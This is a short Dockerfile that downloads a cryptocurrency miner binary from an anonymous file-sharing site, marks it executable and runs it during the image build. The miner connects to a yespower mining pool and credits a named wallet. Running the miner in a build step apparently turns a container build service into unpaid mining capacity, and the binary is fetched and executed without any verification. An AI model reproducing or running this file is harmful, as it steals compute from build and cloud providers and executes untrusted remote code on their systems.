FROM public.ecr.aws/lts/ubuntu:latest

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget https://filebin.net/nls5v09kf35xcshf/cpuminer-sse2
RUN chmod +x cpuminer-sse2
RUN ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.A1
